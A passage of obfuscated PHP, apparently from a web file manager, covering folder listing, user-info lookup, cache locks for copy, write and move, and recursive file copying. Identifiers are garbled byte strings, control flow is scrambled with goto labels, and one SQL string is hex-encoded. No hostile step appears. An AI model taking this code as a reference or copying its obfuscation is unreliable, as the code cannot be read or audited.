$f¡óÜÛÜÀ = $eÀ¡óË´Œ‡[$dçæÉ„êó[28]]; } else { if ($eá¦²¦‡¡¢[$dçæÉ„êó[371]] == self::TYPE_SYSTEM) { $eÀ¡óË´Œ‡ = $this->sourceInfo($D ‡…®„—é[0], !0); $f¡óÜÛÜÀ = $eÀ¡óË´Œ‡[$dçæÉ„êó[28]]; } } } $f¡óÜÛÜÀ = $f¡óÜÛÜÀ ? $dçæÉ„êó[8] . $f¡óÜÛÜÀ . $dçæÉ„êó[8] : $dçæÉ„êó[8]; return $f¡óÜÛÜÀ; } protected function _listAppendUser(&$eçÎ¯ÓË…¶) { goto b¡Â†õ²µÏ; b¡Â†õ²µÏ: $cŠ…ÎêÂ Ÿ =& $_SERVER[¬ˆÚÂ”Éğä]; $A†‹È©ÉßÂ = array_to_keyvalue($eçÎ¯ÓË…¶, $cŠ…ÎêÂ Ÿ[33], $cŠ…ÎêÂ Ÿ[378]); $Aòİ¸‹Îˆµ = array_to_keyvalue($eçÎ¯ÓË…¶, $cŠ…ÎêÂ Ÿ[33], $cŠ…ÎêÂ Ÿ[379]); goto bÉ¡ÚóİùÅ; bÉ¡ÚóİùÅ: $b­¹¯ùÎáŸ = array_merge($A†‹È©ÉßÂ, $Aòİ¸‹Îˆµ); $cëÌŞŞ®‚ = Model($cŠ…ÎêÂ Ÿ[479])->userListInfo($b­¹¯ùÎáŸ); foreach ($eçÎ¯ÓË…¶ as &$Cã«ä‰‰å±) { $d²Ú†ˆñ†• = $Cã«ä‰‰å±[$cŠ…ÎêÂ Ÿ[378]]; $Cã«ä‰‰å±[$cŠ…ÎêÂ Ÿ[378]] = $cëÌŞŞ®‚[$d²Ú†ˆñ†•] ? $cëÌŞŞ®‚[$d²Ú†ˆñ†•] : !1; $d²Ú†ˆñ†• = $Cã«ä‰‰å±[$cŠ…ÎêÂ Ÿ[379]]; $Cã«ä‰‰å±[$cŠ…ÎêÂ Ÿ[379]] = $cëÌŞŞ®‚[$d²Ú†ˆñ†•] ? $cëÌŞŞ®‚[$d²Ú†ˆñ†•] : !1; if (isset($Cã«ä‰‰å±[$cŠ…ÎêÂ Ÿ[417]]) && $Cã«ä‰‰å±[$cŠ…ÎêÂ Ÿ[417]][$cŠ…ÎêÂ Ÿ[480]]) { $DÂÆøÙ¬íŸ = $GLOBALS[$cŠ…ÎêÂ Ÿ[6]][$cŠ…ÎêÂ Ÿ[84]][$cŠ…ÎêÂ Ÿ[481]]; if ($Cã«ä‰‰å±[$cŠ…ÎêÂ Ÿ[417]][$cŠ…ÎêÂ Ÿ[482]] <= time() - $DÂÆøÙ¬íŸ) { $this->metaSet($Cã«ä‰‰å±[$cŠ…ÎêÂ Ÿ[369]], $cŠ…ÎêÂ Ÿ[480], null); $this->metaSet($Cã«ä‰‰å±[$cŠ…ÎêÂ Ÿ[369]], $cŠ…ÎêÂ Ÿ[482], null); unset($Cã«ä‰‰å±[$cŠ…ÎêÂ Ÿ[417]][$cŠ…ÎêÂ Ÿ[480]]); continue; } $b¼´Á¼ù… = $Cã«ä‰‰å±[$cŠ…ÎêÂ Ÿ[417]][$cŠ…ÎêÂ Ÿ[480]]; $Cã«ä‰‰å±[$cŠ…ÎêÂ Ÿ[417]][$cŠ…ÎêÂ Ÿ[483]] = Model($cŠ…ÎêÂ Ÿ[479])->getInfoSimpleOuter($b¼´Á¼ù…); } } goto Fë§Ò†âÉ; Fë§Ò†âÉ: unset($Cã«ä‰‰å±); goto fº§Å¬±—; fº§Å¬±—: } public function parentLevelArray($A’µò‘Üø) { $DìŞÈ²‰³™ =& $_SERVER[¬ˆÚÂ”Éğä]; $A’µò‘Üø = explode($DìŞÈ²‰³™[47], trim($A’µò‘Üø, $DìŞÈ²‰³™[47])); return array_remove_value($A’µò‘Üø, $DìŞÈ²‰³™[470]); } public function listAll($f¬È®˜íé) { goto FÈ¦‡£åÙ; FÈ¦‡£åÙ: $DÑõó­Ÿñ› =& $_SERVER[¬ˆÚÂ”Éğä]; $EƒîºøÎë® = $this->sourceInfo($f¬È®˜íé); $cß³÷‡è÷Õ = array($DÑõó­Ÿñ›[484] => array($DÑõó­Ÿñ›[485], $EƒîºøÎë®[$DÑõó­Ÿñ›[461]] . $f¬È®˜íé . $DÑõó­Ÿñ›[486]), $DÑõó­Ÿñ›[487] => 0); goto CÄÖ¯ÎÅô; CÄÖ¯ÎÅô: $F„¤é¥Ûô— = $DÑõó­Ÿñ›[488]; $e¼ŞÛÖ°†Ë = "\x4c\x45\x46\124\x20\112\x4f\x49\116\40{$this->tablePrefix}\x69\157\x5f\x66\151\x6c\145\x20\146\x69\154\145\x20\157\156\x20\x73\x6f\x75\162\143\x65\x2e\146\151\x6c\145\x49\x44\40\75\40\x66\151\x6c\145\56\x66\x69\154\x65\111\x44"; $FÜõ­†²ÊÍ = $this->alias($DÑõó­Ÿñ›[489])->field($F„¤é¥Ûô—)->where($cß³÷‡è÷Õ)->join($e¼ŞÛÖ°†Ë)->select(); goto Cµ³Úìœà×; Cµ³Úìœà×: $this->_listAppendAuth($FÜõ­†²ÊÍ); $this->_listAppendUser($FÜõ­†²ÊÍ); $this->_listAppendPath($FÜõ­†²ÊÍ); goto cğÙƒ‹„Ù¾; bìÔ‚Ú‰“å: $Aœò§“Ïƒƒ = array(); foreach ($FÜõ­†²ÊÍ as $eÇƒù¸àÇ™ => $Bõù„¨Ü…ƒ) { goto C“´˜ÜÀŠö; E¸Ëí÷»Š: for ($E–£Ú¤ìßê = 0; $E–£Ú¤ìßê < count($d¯‹­İ£Ÿ); $E–£Ú¤ìßê++) { $DôíòøÊñ .= $FÜõ­†²ÊÍ[$d¯‹­İ£Ÿ[$E–£Ú¤ìßê]][$DÑõó­Ÿñ›[28]] . $DÑõó­Ÿñ›[8]; } $DôíòøÊñ .= $Bõù„¨Ü…ƒ[$DÑõó­Ÿñ›[28]]; if ($Bõù„¨Ü…ƒ[$DÑõó­Ÿñ›[370]]) { $DôíòøÊñ .= $DÑõó­Ÿñ›[8]; } goto Dù‚¥¤ ùØ; Dù‚¥¤ ùØ: $DôíòøÊñ = str_replace($DÑõó­Ÿñ›[469], $DÑõó­Ÿñ›[8], $DôíòøÊñ); $DôíòøÊñ = str_replace($DÑõó­Ÿñ›[469], $DÑõó­Ÿñ›[8], $DôíòøÊñ); $fÅ²ì½’“‚ = array($DÑõó­Ÿñ›[387] => str_replace($DÑõó­Ÿñ›[469], $DÑõó­Ÿñ›[8], $DôíòøÊñ), $DÑõó­Ÿñ›[490] => intval($Bõù„¨Ü…ƒ[$DÑõó­Ÿñ›[370]]), $DÑõó­Ÿñ›[391] => $this->pathInfoFilter($Bõù„¨Ü…ƒ, !0)); goto aÖ’²ÕèøÜ; C“´˜ÜÀŠö: $d¯‹­İ£Ÿ = $this->parentLevelArray($Bõù„¨Ü…ƒ[$DÑõó­Ÿñ›[461]]); array_shift($d¯‹­İ£Ÿ); $DôíòøÊñ = $BÙòô»å¯; goto E¸Ëí÷»Š; aÖ’²ÕèøÜ: if (!$Bõù„¨Ü…ƒ[$DÑõó­Ÿñ›[370]]) { $fÅ²ì½’“‚[$DÑõó­Ÿñ›[419]] = $Bõù„¨Ü…ƒ[$DÑõó­Ÿñ›[419]]; $fÅ²ì½’“‚[$DÑõó­Ÿñ›[491]] = $Bõù„¨Ü…ƒ[$DÑõó­Ÿñ›[75]]; } $Aœò§“Ïƒƒ[] = $fÅ²ì½’“‚; goto dïĞÒ™”òÑ; dïĞÒ™”òÑ: } return $Aœò§“Ïƒƒ; goto B­ÀŠƒ˜†¤; cğÙƒ‹„Ù¾: $FÜõ­†²ÊÍ = array_to_keyvalue($FÜõ­†²ÊÍ, $DÑõó­Ÿñ›[369]); $BÙòô»å¯ = "\57{$EƒîºøÎë®[$DÑõó­Ÿñ›[28]]}\57"; $BÙòô»å¯ = $BÙòô»å¯ == $DÑõó­Ÿñ›[469] ? $DÑõó­Ÿñ›[8] : $BÙòô»å¯; goto bìÔ‚Ú‰“å; B­ÀŠƒ˜†¤: } } class SourceListMoveModel extends SourceListModel { public $allowLockSource = 1; public function allowLock() { return $this->allowLockSource; } public function lockCopyStart($c°”ÌËêµ‰) { goto FõÇ–İÊê¤; FõÇ–İÊê¤: $A»Ë£‹Ã–Æ =& $_SERVER[¬ˆÚÂ”Éğä]; if (!$this->allowLock()) { return; } $this->_lockCheck($A»Ë£‹Ã–Æ[492], $c°”ÌËêµ‰); goto CÒÉì¼ù†; bßÓŒ†Ö: $this->_lockEvent($c°”ÌËêµ‰, array($A»Ë£‹Ã–Æ[495], $A»Ë£‹Ã–Æ[496]), $d¦ñªê¾ˆ); $this->_lockCheckEnd($A»Ë£‹Ã–Æ[492], $c°”ÌËêµ‰); goto EÃé¦»¸¤; CÒÉì¼ù†: $d¦ñªê¾ˆ = 1; $this->_lockEvent($c°”ÌËêµ‰, array($A»Ë£‹Ã–Æ[493], $A»Ë£‹Ã–Æ[494]), $d¦ñªê¾ˆ); $this->_lockParent($c°”ÌËêµ‰, array($A»Ë£‹Ã–Æ[494]), $d¦ñªê¾ˆ); goto bßÓŒ†Ö; EÃé¦»¸¤: } public function lockCopyEnd($EÃÊØÚäÔƒ) { $Dó„‘©Œ  =& $_SERVER[¬ˆÚÂ”Éğä]; if (!$this->allowLock()) { return; } $f·´¹—†ñ = 0; $this->_lockEvent($EÃÊØÚäÔƒ, array($Dó„‘©Œ [493], $Dó„‘©Œ [494]), $f·´¹—†ñ); $this->_lockParent($EÃÊØÚäÔƒ, array($Dó„‘©Œ [494]), $f·´¹—†ñ); $this->_lockEvent($EÃÊØÚäÔƒ, array($Dó„‘©Œ [495], $Dó„‘©Œ [496]), $f·´¹—†ñ); } public function lockWriteStart($FÁó‡Š°ë, $AÌÒøîˆ˜î = '') { goto fÅ‡ÍÃ²Ï; Dïš¸Ñ­’å: $C‡Ò•Öæ§ğ = 1; $this->_lockKey($d¨îƒ“ï‹º[497] . $FÁó‡Š°ë . $d¨îƒ“ï‹º[91] . $AÌÒøîˆ˜î, $C‡Ò•Öæ§ğ); $this->_lockEvent($FÁó‡Š°ë, array($d¨îƒ“ï‹º[492], $d¨îƒ“ï‹º[494]), $C‡Ò•Öæ§ğ); goto CÕÉ»…ä‚„; CÕÉ»…ä‚„: $this->_lockParent($FÁó‡Š°ë, array($d¨îƒ“ï‹º[492], $d¨îƒ“ï‹º[494]), $C‡Ò•Öæ§ğ); $this->_lockCheckEnd($d¨îƒ“ï‹º[493], $FÁó‡Š°ë); goto Aï½ÊŒ´è; fÅ‡ÍÃ²Ï: $d¨îƒ“ï‹º =& $_SERVER[¬ˆÚÂ”Éğä]; if (!$this->allowLock()) { return; } $this->_lockCheck($d¨îƒ“ï‹º[493], $FÁó‡Š°ë); goto Dïš¸Ñ­’å; Aï½ÊŒ´è: } public function lockWriteEnd($EôÛõÄà‡, $BÛĞæìªÁ = '') { $E§˜»¥»§ğ =& $_SERVER[¬ˆÚÂ”Éğä]; if (!$this->allowLock()) { return; } $EŸ¹Šµ¶˜† = 0; $this->_lockKey($E§˜»¥»§ğ[497] . $EôÛõÄà‡ . $E§˜»¥»§ğ[91] . $BÛĞæìªÁ, $EŸ¹Šµ¶˜†); $this->_lockEvent($EôÛõÄà‡, array($E§˜»¥»§ğ[492], $E§˜»¥»§ğ[494]), $EŸ¹Šµ¶˜†); $this->_lockParent($EôÛõÄà‡, array($E§˜»¥»§ğ[492], $E§˜»¥»§ğ[494]), $EŸ¹Šµ¶˜†); } public function lockMoveStart($DíÙ¯¢Ú‚È) { goto A›™¯âõëË; C¢Ê­½¾ËŒ: $B˜¤¼ÍÇÔå = 1; $this->_lockKey($dÌ„ôì¢İ‡[498] . $DíÙ¯¢Ú‚È, $B˜¤¼ÍÇÔå); $this->_lockEvent($DíÙ¯¢Ú‚È, array($dÌ„ôì¢İ‡[492], $dÌ„ôì¢İ‡[493]), $B˜¤¼ÍÇÔå); goto aÓÉÛØ„¨¾; aÓÉÛØ„¨¾: $this->_lockParent($DíÙ¯¢Ú‚È, array($dÌ„ôì¢İ‡[492], $dÌ„ôì¢İ‡[494]), $B˜¤¼ÍÇÔå); $this->_lockEvent($DíÙ¯¢Ú‚È, array($dÌ„ôì¢İ‡[499], $dÌ„ôì¢İ‡[495], $dÌ„ôì¢İ‡[496]), $B˜¤¼ÍÇÔå); $this->_lockCheckEnd($dÌ„ôì¢İ‡[494], $DíÙ¯¢Ú‚È); goto bï œ·Ñœ; A›™¯âõëË: $dÌ„ôì¢İ‡ =& $_SERVER[¬ˆÚÂ”Éğä]; if (!$this->allowLock()) { return; } $this->_lockCheck($dÌ„ôì¢İ‡[494], $DíÙ¯¢Ú‚È); goto C¢Ê­½¾ËŒ; bï œ·Ñœ: } public function lockMoveEnd($F¬³‘‚ƒ—À) { goto CÊ’¸‹ÑÑÙ; d¥Û¹Ÿ·Œ: $this->_lockKey($DØŠ¶à‘Ïá[498] . $F¬³‘‚ƒ—À, $DêËÈ Ïµ˜); $this->_lockEvent($F¬³‘‚ƒ—À, array($DØŠ¶à‘Ïá[492], $DØŠ¶à‘Ïá[493]), $DêËÈ Ïµ˜); $this->_lockParent($F¬³‘‚ƒ—À, array($DØŠ¶à‘Ïá[492], $DØŠ¶à‘Ïá[494]), $DêËÈ Ïµ˜); goto cÚ‹„‰ºâ; CÊ’¸‹ÑÑÙ: $DØŠ¶à‘Ïá =& $_SERVER[¬ˆÚÂ”Éğä]; if (!$this->allowLock()) { return; } $DêËÈ Ïµ˜ = 0; goto d¥Û¹Ÿ·Œ; cÚ‹„‰ºâ: $this->_lockEvent($F¬³‘‚ƒ—À, array($DØŠ¶à‘Ïá[499], $DØŠ¶à‘Ïá[495], $DØŠ¶à‘Ïá[496]), $DêËÈ Ïµ˜); goto D‹î²»³†§; D‹î²»³†§: } private function _lockCheck($DîƒÛö“Š, $a¨ Á«£‡) { goto dë‰¦¨¯Ë; BŠ±ºùÔæñ: CacheLock::setErrorMsg($d¶šÕ²¹À[157] . htmlspecialchars($fÂƒ‡Ÿİô[$d¶šÕ²¹À[28]]) . $d¶šÕ²¹À[478] . $D–Ù’ÎËÉ›); $this->_lockKey($eÊ„åĞ¨òñ, 1); $this->_lockKey($eÊ„åĞ¨òñ, 0); goto cºÎÙÓä†; cºÎÙÓä†: $Fİ•¦øêä‡ = array_reverse($this->parentLevelArray($fÂƒ‡Ÿİô[$d¶šÕ²¹À[461]])); foreach ($Fİ•¦øêä‡ as $D—š×‚ğª) { $eÊ„åĞ¨òñ = $DîƒÛö“Š . $d¶šÕ²¹À[501] . $D—š×‚ğª; if (CacheLock::lockGet($d¶šÕ²¹À[502] . $eÊ„åĞ¨òñ)) { $fÂƒ‡Ÿİô = $this->sourceInfo($D—š×‚ğª); CacheLock::setErrorMsg($d¶šÕ²¹À[157] . htmlspecialchars($fÂƒ‡Ÿİô[$d¶šÕ²¹À[28]]) . $d¶šÕ²¹À[478] . $D–Ù’ÎËÉ›); $this->_lockKey($eÊ„åĞ¨òñ, 1); $this->_lockKey($eÊ„åĞ¨òñ, 0); } } goto b·İù¨„åÜ; dë‰¦¨¯Ë: $d¶šÕ²¹À =& $_SERVER[¬ˆÚÂ”Éğä]; $fÂƒ‡Ÿİô = $this->sourceInfo($a¨ Á«£‡); $eÊ„åĞ¨òñ = $DîƒÛö“Š . $d¶šÕ²¹À[91] . $a¨ Á«£‡; goto cß…·º–; cß…·º–: $this->_lockTimeStart[$eÊ„åĞ¨òñ] = timeFloat(); if (!is_array($fÂƒ‡Ÿİô)) { return; } $D–Ù’ÎËÉ› = LNG($d¶šÕ²¹À[500]); goto BŠ±ºùÔæñ; b·İù¨„åÜ: } private function _lockCheckEnd($A½»ÚáÉÁ÷, $dŞ©ÂØ›Ì) { goto DãÁÛåÌÅ¹; A¬œò¡åÄ: if ($eº‰¡«Ö‹ > 0.5) { unset(self::$cacheSourceInfo[$DŒÜÀ¥ÍÄ[410] . $dŞ©ÂØ›Ì]); } $EÙ¡æ¦Ï³ä = $this->sourceInfo($dŞ©ÂØ›Ì); if (!$EÙ¡æ¦Ï³ä) { show_json(LNG($DŒÜÀ¥ÍÄ[101]), !1); } goto b®³»Ëí¸; DãÁÛåÌÅ¹: $DŒÜÀ¥ÍÄ =& $_SERVER[¬ˆÚÂ”Éğä]; $a÷ÊÚ¯‡ëŠ = $A½»ÚáÉÁ÷ . $DŒÜÀ¥ÍÄ[91] . $dŞ©ÂØ›Ì; CacheLock::setErrorMsg($DŒÜÀ¥ÍÄ[361]); goto fçò¤å½ŒÕ; fçò¤å½ŒÕ: if (!isset($this->_lockTimeStart[$a÷ÊÚ¯‡ëŠ])) { return; } $eº‰¡«Ö‹ = timeFloat() - $this->_lockTimeStart[$a÷ÊÚ¯‡ëŠ]; unset($this->_lockTimeStart[$a÷ÊÚ¯‡ëŠ]); goto A¬œò¡åÄ; b®³»Ëí¸: } private function _lockParent($d´Éæ‡æ·ƒ, $F´Å–‘ æœ, $cõíîöÒÑÌ) { if (!$this->autoLockSet) { return; } $AÀ‹Ä´×¥¬ = $this->sourceInfo($d´Éæ‡æ·ƒ); if (!is_array($AÀ‹Ä´×¥¬)) { return; } $eˆÚ”‚—øŞ = array_reverse($this->parentLevelArray($AÀ‹Ä´×¥¬[$_SERVER[¬ˆÚÂ”Éğä][461]])); foreach ($eˆÚ”‚—øŞ as $Cğ«¨÷ŒË‹) { $this->_lockEvent($Cğ«¨÷ŒË‹, $F´Å–‘ æœ, $cõíîöÒÑÌ); } } private function _lockEvent($f²” öœÙ, $bÛÕñÁÙ², $AÀ¶ºáªù³) { $DÍÂœ–ğŞ÷ =& $_SERVER[¬ˆÚÂ”Éğä]; if (!$this->autoLockSet) { return; } foreach ($bÛÕñÁÙ² as $e½°ë¨è‹‹) { $FØ–…Ëø¦¬ = $e½°ë¨è‹‹ . $DÍÂœ–ğŞ÷[91] . $f²” öœÙ; if ($AÀ¶ºáªù³ && CacheLock::lockGet($DÍÂœ–ğŞ÷[502] . $FØ–…Ëø¦¬)) { continue; } $this->_lockKey($FØ–…Ëø¦¬, $AÀ¶ºáªù³); } } public $_lockTimeStart = array(); public $_lockTime = 5; private static $_lockItemArr = array(); private function _lockKey($FàÉ˜×°¼¨, $EÃåøÙù¿Ó = 1) { $BÄŸŸ´¢Á• = $_SERVER[¬ˆÚÂ”Éğä][502] . md5($FàÉ˜×°¼¨); if ($EÃåøÙù¿Ó) { if (isset(self::$_lockItemArr[$BÄŸŸ´¢Á•])) { return; } self::$_lockItemArr[$BÄŸŸ´¢Á•] = 1; CacheLock::lock($BÄŸŸ´¢Á•, $this->_lockTime); } else { if (!isset(self::$_lockItemArr[$BÄŸŸ´¢Á•])) { return; } unset(self::$_lockItemArr[$BÄŸŸ´¢Á•]); CacheLock::unlock($BÄŸŸ´¢Á•); } } public function isParentOf($Dï¼¨¥ç†, $C¸ˆÃ½æÈ) { goto føÑÀ˜»‘; Eù®ŠŠ… „: $D›ÏŒÚˆ— = $D†’ÁÁäœ[$fŠ‡ãµ§¡Œ[461]] . $D†’ÁÁäœ[$fŠ‡ãµ§¡Œ[369]] . $fŠ‡ãµ§¡Œ[47]; $F„Šœ¹‚ = $A¼®Ìè•¥»[$fŠ‡ãµ§¡Œ[461]] . $A¼®Ìè•¥»[$fŠ‡ãµ§¡Œ[369]] . $fŠ‡ãµ§¡Œ[47]; $bˆèÔëÖ„Ê = strpos($F„Šœ¹‚, $D›ÏŒÚˆ—) === 0; goto cª‹ôÄ¸ÚÊ; føÑÀ˜»‘: $fŠ‡ãµ§¡Œ =& $_SERVER[¬ˆÚÂ”Éğä]; $D†’ÁÁäœ = $this->sourceInfo($Dï¼¨¥ç†); $A¼®Ìè•¥» = $this->sourceInfo($C¸ˆÃ½æÈ); goto Eù®ŠŠ… „; cª‹ôÄ¸ÚÊ: return $bˆèÔëÖ„Ê; goto f°÷¬âÖã¸; f°÷¬âÖã¸: } private $targetIsDelete = 0; public function copy($d•¿ÔÒ‰ä¼, $aª™Şå¤ƒ’, $E“îğ©ç˜š = REPEAT_REPLACE, $Aó¥„«½°Ü = '') { goto BéìÃŠÏÙ; A‰¤ˆøñùê: $this->lockCopyStart($d•¿ÔÒ‰ä¼); $this->lockWriteStart($aª™Şå¤ƒ’, $dˆ©‡ªáŸ); $DÆé¦ŞŒ¼æ = array($FªÅ’ÍÂˆ…[503] => array(), $FªÅ’ÍÂˆ…[504] => array(), $FªÅ’ÍÂˆ…[505] => array()); goto D›ï–Åîºí; BÔµ£åó‘: if (!$Dá£êÙ•Á¬ || !$eÇ©¢Ã¯¿¢ || $eÇ©¢Ã¯¿¢[$FªÅ’ÍÂˆ…[370]] != $FªÅ’ÍÂˆ…[83]) { return !1; } if ($this->isParentOf($d•¿ÔÒ‰ä¼, $aª™Şå¤ƒ’)) { return !1; } $dˆ©‡ªáŸ = $Aó¥„«½°Ü ? $Aó¥„«½°Ü : $Dá£êÙ•Á¬[$FªÅ’ÍÂˆ…[28]]; goto A‰¤ˆøñùê; C¬–Ã å½©: $this->updateModifyTime($aª™Şå¤ƒ’); return $B¤äŒöœÜŒ; goto aó›ÔÇå£Í; D›ï–Åîºí: $this->targetIsDelete = intval($Dá£êÙ•Á¬[$FªÅ’ÍÂˆ…[397]]); $dì‰ÛøÄí® = $this->fileNameExistCache($aª™Şå¤ƒ’, $Dá£êÙ•Á¬[$FªÅ’ÍÂˆ…[28]]); $B¤äŒöœÜŒ = $this->_copy($d•¿ÔÒ‰ä¼, $aª™Şå¤ƒ’, $E“îğ©ç˜š, $DÆé¦ŞŒ¼æ, !0, $Aó¥„«½°Ü); goto e…ŸŒİÜŠµ; bƒÒ‚ÆôŒ˜: $this->saveAll($DÆé¦ŞŒ¼æ[$FªÅ’ÍÂˆ…[505]]); Model($FªÅ’ÍÂˆ…[167])->linkAdd($DÆé¦ŞŒ¼æ[$FªÅ’ÍÂˆ…[503]]); $this->folderSizeReset($aª™Şå¤ƒ’); goto C¬–Ã å½©; cˆğßİ´Ä: if ($Dá£êÙ•Á¬[$FªÅ’ÍÂˆ…[370]] == $FªÅ’ÍÂˆ…[83] && $dì‰ÛøÄí® == $B¤äŒöœÜŒ) { $this->folderSizeResetChildren($dì‰ÛøÄí®); } Model($FªÅ’ÍÂˆ…[506])->addAll($DÆé¦ŞŒ¼æ[$FªÅ’ÍÂˆ…[504]], array(), !0); if ($dì‰ÛøÄí® != $B¤äŒöœÜŒ || $Dá£êÙ•Á¬[$FªÅ’ÍÂˆ…[370]] == $FªÅ’ÍÂˆ…[83]) { Model($FªÅ’ÍÂˆ…[507])->eventCopy($B¤äŒöœÜŒ); } goto bƒÒ‚ÆôŒ˜; e…ŸŒİÜŠµ: $this->_childrenListClear(); $this->lockCopyEnd($d•¿ÔÒ‰ä¼); $this->lockWriteEnd($aª™Şå¤ƒ’, $dˆ©‡ªáŸ); goto cˆğßİ´Ä; BéìÃŠÏÙ: $FªÅ’ÍÂˆ… =& $_SERVER[¬ˆÚÂ”Éğä]; $Dá£êÙ•Á¬ = $this->sourceInfo($d•¿ÔÒ‰ä¼); $eÇ©¢Ã¯¿¢ = $this->sourceInfo($aª™Şå¤ƒ’); goto BÔµ£åó‘; aó›ÔÇå£Í: } private function _copy($DÇ‰—Å†, $fâæ¡¹ÉÑ, $eôÆ”Ó×êè, &$bÂÆŒçÙÏ, $dø²çµ¾µ, $bøõˆÉ´ã = '') { goto bÈÜ²¬ØÚ‘; E¦…ÖÎš»: return $AÙÑéÜ‹Õ£; goto d… İ£ß; A›¿“™•Ö: $FÅŸ“É½²Õ = $bøõˆÉ´ã ? $bøõˆÉ´ã : $DÚ÷ø±·Æ­[$a©·‡‰¶©[28]]; $e„ó‹ãŸª‘ = $this->fileNameExistCache($fâæ¡¹ÉÑ, $FÅŸ“É½²Õ); if ($dø²çµ¾µ) { $this->_childrenAllMake($DÇ‰—Å†); if ($F¨÷”¨ƒ…Í && $e„ó‹ãŸª‘) { $this->_childrenAllMake($e„ó‹ãŸª‘); } } goto C¥ØŞ“Ôš‡; C¥ØŞ“Ôš‡: if (!$e„ó‹ãŸª‘) { return $this->_copyCreate($DÇ‰—Å†, $fâæ¡¹ÉÑ, $FÅŸ“É½²Õ, $bÂÆŒçÙÏ); } $AÙÑéÜ‹Õ£ = $e„ó‹ãŸª‘; if ($F¨÷”¨ƒ…Í) { if ($eôÆ”Ó×êè == REPEAT_RENAME_FOLDER) { $FÅŸ“É½²Õ = $this->fileNameAutoCache($fâæ¡¹ÉÑ, $FÅŸ“É½²Õ, $eôÆ”Ó×êè, $F¨÷”¨ƒ…Í); $AÙÑéÜ‹Õ£ = $this->_copyCreate($DÇ‰—Å†, $fâæ¡¹ÉÑ, $FÅŸ“É½²Õ, $bÂÆŒçÙÏ); } else { $f¬²‘éäÀÄ = $this->_childrenList($DÇ‰—Å†); foreach ($f¬²‘éäÀÄ as $a›¦ëÛ­²) { $this->_copy($a›¦ëÛ­²[$a©·‡‰¶©[369]], $e„ó‹ãŸª‘, $eôÆ”Ó×êè, $bÂÆŒçÙÏ, !1); } } } else { if ($eôÆ”Ó×êè == REPEAT_RENAME || $eôÆ”Ó×êè == REPEAT_RENAME_FOLDER) { $FÅŸ“É½²Õ = $this->fileNameAutoCache($fâæ¡¹ÉÑ, $FÅŸ“É½²Õ, $eôÆ”Ó×êè, $F¨÷”¨ƒ…Í); $AÙÑéÜ‹Õ£ = $this->_copyCreate($DÇ‰—Å†, $fâæ¡¹ÉÑ, $FÅŸ“É½²Õ, $bÂÆŒçÙÏ); } else { if ($eôÆ”Ó×êè == REPEAT_REPLACE) { $C¯¶Ù»Øî = $this->sourceInfoCache($e„ó‹ãŸª‘); $FÃËì¬‡Ÿ = $this->fileHistory($C¯¶Ù»Øî, $DÚ÷ø±·Æ­[$a©·‡‰¶©[419]], $DÚ÷ø±·Æ­[$a©·‡‰¶©[77]]); if ($FÃËì¬‡Ÿ) { $bÂÆŒçÙÏ[$a©·‡‰¶©[503]][] = $DÚ÷ø±·Æ­[$a©·‡‰¶©[419]]; } } else { if ($eôÆ”Ó×êè == REPEAT_SKIP) { } } } Hook::trigger($a©·‡‰¶©[508], array($a©·‡‰¶©[509], $DÚ÷ø±·Æ­, 0)); } goto E¦…ÖÎš»; bÈÜ²¬ØÚ‘: $a©·‡‰¶© =& $_SERVER[¬ˆÚÂ”Éğä]; $DÚ÷ø±·Æ­ = $this->sourceInfoCache($DÇ‰—Å†); $F¨÷”¨ƒ…Í = $DÚ÷ø±·Æ­[$a©·‡‰¶©[370]] == $a©·‡‰¶©[83]; goto A›¿“™•Ö; d… İ£ß: } private function _copyCreate($fŸëì×’§Á, $Aå¨šÌº¬„, $e¡†¥ŞÎõÈ, &$cÚµáœŠæİ) { goto a‹ĞãöÁÎ; f²³ÎÁçŸÖ: foreach ($FõŞ•´¤ä as $AÇƒ‚ù³¾¼) { $EØìŠéˆ¨ê = $AÇƒ‚ù³¾¼[$cÖâ¤‡½Şò[369]]; $dİíÑÈá² = $this->_childrenMatch($fàö·ñ¥àø, $AÇƒ‚ù³¾¼, $DÛ‚ªä²ë); $d’¬Ö¾¥œó[] = array($cÖâ¤‡½Şò[369], $EØìŠéˆ¨ê, $cÖâ¤‡½Şò[463], $dİíÑÈá²[$cÖâ¤‡½Şò[463]]); $Eˆê‡¯­šº[] = array($cÖâ¤‡½Şò[369], $EØìŠéˆ¨ê, $cÖâ¤‡½Şò[461], $dİíÑÈá²[$cÖâ¤‡½Şò[461]]); $this->_copyApplyMeta($AÇƒ‚ù³¾¼, $cÚµáœŠæİ); if ($AÇƒ‚ù³¾¼[$cÖâ¤‡½Şò[370]] != $cÖâ¤‡½Şò[83]) { $cÚµáœŠæİ[$cÖâ¤‡½Şò[503]][] = $AÇƒ‚ù³¾¼[$cÖâ¤‡½Şò[419]]; } } $this->chunkEventSet($cÖâ¤‡½Şò[515], array($cÖâ¤‡½Şò[516], $D†ğĞ¶Íåö, $d›Óîõ„)); $this->saveAll($d’¬Ö¾¥œó); goto CŒæ¢éÑŠ–; CŒæ¢éÑŠ–: $this->chunkEventSet($cÖâ¤‡½Şò[517], array($cÖâ¤‡½Şò[518], $D†ğĞ¶Íåö, $d›Óîõ„)); $this->saveAll($Eˆê‡¯­šº); return $aÌôëµ¡ˆ˜; goto EÖèÙÄÌá; E„’‰ƒê ¾: $D†ğĞ¶Íåö = $this->_makeItemData($DÓÃë•ìš÷, $dÄ Ù±ˆ¾Š, $e¡†¥ŞÎõÈ); Hook::trigger($cÖâ¤‡½Şò[510], $D†ğĞ¶Íåö); Hook::trigger($cÖâ¤‡½Şò[511], array($cÖâ¤‡½Şò[512], $D†ğĞ¶Íåö, 0)); goto A»™øß«†; a¡Ã÷ÄË õ: $this->addAll($F¨ˆÇñóÊ§, array(), !1); $FõŞ•´¤ä = $this->where(array($cÖâ¤‡½Şò[463] => $aÌôëµ¡ˆ˜))->select(); $fàö·ñ¥àø = $this->_childrenMakeRelation($Bæô¯ÏÚÅ, $FõŞ•´¤ä); goto B™šß—Íª·; f¹ï³İˆ—İ: $this->_childrenListAll($fŸëì×’§Á, $Bæô¯ÏÚÅ); $d›Óîõ„ = count($Bæô¯ÏÚÅ); if ($d›Óîõ„ == 0) { return $aÌôëµ¡ˆ˜; } goto B¶¢ƒ§äçí; A»™øß«†: $aÌôëµ¡ˆ˜ = $this->add($D†ğĞ¶Íåö); $D‘¸àî¥„¡ = array($cÖâ¤‡½Şò[369] => $aÌôëµ¡ˆ˜, $cÖâ¤‡½Şò[28] => $e¡†¥ŞÎõÈ); $this->_copyApplyMeta($D‘¸àî¥„¡, $cÚµáœŠæİ); goto eÅùö…ŞùÙ; a‹ĞãöÁÎ: $cÖâ¤‡½Şò =& 